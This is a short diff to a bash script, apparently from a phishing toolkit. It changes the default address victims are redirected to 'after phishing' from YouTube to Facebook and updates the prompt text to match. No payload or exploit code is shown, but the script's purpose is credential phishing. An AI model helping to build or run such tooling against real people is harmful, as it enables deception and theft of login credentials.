@@ -313,9 +313,9 @@ checkfound
 redirect() {
 
 
-default_redirect="https://www.youtube.com"
+default_redirect="https://www.facebook.com"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Youtube \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m facebook \e[0m\e[1;33m): \e[0m'
 read redirect
 redirect="${redirect:-${default_redirect}}"
 
